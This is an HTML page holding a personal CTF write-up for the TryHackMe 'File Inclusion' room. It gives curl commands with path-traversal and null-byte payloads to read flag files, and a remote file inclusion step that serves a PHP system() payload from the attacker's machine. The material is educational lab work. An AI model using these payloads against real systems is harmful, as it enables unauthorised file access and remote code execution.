ctf/tryhackme/file-inclusion.html
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>File Inclusion (TryHackMe)</title>
<meta name="generator" content="Org mode" />
<link rel='stylesheet' href='/css/default.css' />
<link rel='stylesheet' href='/css/source-code.css' />
</head>
<body>
<div id="preamble" class="status">

<h1 id='site-name'>
  <tt>
    <span class='org-br-prompt'>(</span><span class='org-keyword'>setq</span>
    <span class='org-variable-name'>plaintext</span>
    'everywhere<span class='org-br-prompt'>)</span>
  </tt>
</h1>
<div id='menu'>
  <a href='/'>Home</a>
  <a href='/ctf/index.html'>CTF WriteUps</a>
  <a href='/emacs/index.html'>Emacs</a>
  <a href='/linux/index.html'>Linux Tutorials</a>
  <a href='https://gitlab.com/bryos/dotfiles' target='_blank'>Dotfiles</a>
</div>
<br><hr>
</div>
<div id="content">
<h1 class="title">File Inclusion (TryHackMe)</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#intro">1. Intro</a></li>
<li><a href="#challenges">2. Challenges</a></li>
</ul>
</div>
</div>

<div id="outline-container-org1ee450a" class="outline-2">
<h2 id="intro"><span class="section-number-2">1</span> <a href="#intro">Intro</a></h2>
<div class="outline-text-2" id="text-intro">
<p>
<span class="timestamp-wrapper"><span class="timestamp">[2023-01-28 Sat]</span></span>
</p>

<p>
This is a write up for the Challenges part of the TryHackMe room <a href="https://tryhackme.com/room/fileinc">File
Inclusion</a>.
</p>
</div>
</div>

<div id="outline-container-org4af3fcd" class="outline-2">
<h2 id="challenges"><span class="section-number-2">2</span> <a href="#challenges">Challenges</a></h2>
<div class="outline-text-2" id="text-challenges">
</div>
<div id="outline-container-orgc6da7df" class="outline-3">
<h3 id="flag-1"><span class="section-number-3">2.1</span> <a href="#flag-1">Flag 1</a></h3>
<div class="outline-text-3" id="text-flag-1">
<p>
On the right hand side of Firefox open the <code>menu &gt; Web Developer &gt;
Inspector</code>. In the html source code find the form tag and change the
method from <code>GET</code> to <code>POST</code>. Then on the actual web page fill <code>/etc/flag1</code> in
in the form and press the include button. This should reveal the flag.
</p>
</div>
</div>

<div id="outline-container-org9326e5a" class="outline-3">
<h3 id="flag-2"><span class="section-number-3">2.2</span> <a href="#flag-2">Flag 2</a></h3>
<div class="outline-text-3" id="text-flag-2">
<p>
From the hint it is clear that we have to edit the cookie to find the
flag. To inspect the cookie run:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -v http://10.10.124.167/challenges/chall2.php
</pre>
</div>

<p>
and find the cookie among the header of the output. It has the value
<code>Cookie: THM=Guest</code>. The obvious thing is to try and change the value
<code>Admin</code>:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -H <span class="org-string">'Cookie: THM=Admin'</span> http://10.10.124.167/challenges/chall2.php -o flag2.txt
</pre>
</div>

<p>
which reveals the admin page. Since there is not input form on this
page and it is a LFI room the next thing to try is to change the value
of the cookie to the file path to the flag. After a few tries the
correct value was found:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -H <span class="org-string">'Cookie: THM=../../../../etc/flag2%00'</span> http://10.10.124.167/challenges/chall2.php -o flag2.txt
</pre>
</div>

<p>
Locate the flag at the end of the file <code>flag2.txt</code>.
</p>
</div>
</div>

<div id="outline-container-orgd001bad" class="outline-3">
<h3 id="flag-3"><span class="section-number-3">2.3</span> <a href="#flag-3">Flag 3</a></h3>
<div class="outline-text-3" id="text-flag-3">
<p>
The url input is filtered, everything that is not a-z is filtered
out. To get around this change the method from get to <code>GET</code> to <code>POST</code>
and set the data to be posted to <code>/etc/flag3%00</code>. The <code>%00</code> is
necessary to prevent the <code>.php</code> from being added at the end as
explained previously in the room.
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -v http://ip/challenges/chall3.php -X  POST -d <span class="org-string">'file=/etc/flag3%00'</span> -o flag3.txt
</pre>
</div>

<p>
Locate the flag at the end of the file <code>flag3.txt</code>.
</p>
</div>
</div>

<div id="outline-container-org4f75f77" class="outline-3">
<h3 id="playground"><span class="section-number-3">2.4</span> <a href="#playground">Playground</a></h3>
<div class="outline-text-3" id="text-playground">
<p>
Since this is a RFI exercise we first need to create a <code>.php</code> file
that will execute the command we want, <code>hostname</code>.
</p>

<div class="org-src-container">
<pre class="src src-sh"><span class="org-builtin">echo</span> <span class="org-string">"&lt;?PHP echo system('hostname') ?&gt;"</span> &gt; rfi.php
</pre>
</div>

<p>
Next we need a simple server that will host our file. The simplest way
to do this is with python.
</p>

<div class="org-src-container">
<pre class="src src-sh">python -m http.server &amp;
</pre>
</div>

<p>
And finally add the file as a parameter in the url to get the hostname:
</p>

<div class="org-src-container">
<pre class="src src-sh">curl http://10.10.124.167/playground.php?<span class="org-variable-name">file</span>=http://10.10.95.70:8000/rfi.php
</pre>
</div>

<p>
Note: the IP of the remote file is the IP of the attackbox and for the
port number see the output of the python command. The port number
defaults to 8000 but can be different.
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<br><br>
<div style='text-align: center;'>
  If something is not working, please create an issue
  <a href='https://gitlab.com/bryanrinders/bryanrinders.xyz/-/issues'>here</a>.
</div>
<br><hr/>
<footer>
  <div class='copyright-container'>
    <div class='copyright'>
      Copyright &copy; 2022-2024 Bryan Rinders some rights reserved
      <br><br>
      This page is available under a
      <a rel='license' href='http://creativecommons.org/licenses/by/4.0/'>
        CC-BY 4.0
      </a> licence.
    </div>
  </div>
  <br>
  <div class='generated'>
    Created with <a href="https://www.gnu.org/software/emacs/">Emacs</a> 27.1 (<a href="https://orgmode.org">Org</a> mode 9.3) on <a href='https://www.gnu.org'>GNU</a>+<a href='https://www.kernel.org/'>Linux</a>
  </div>
</footer>
</div>
</body>
</html>
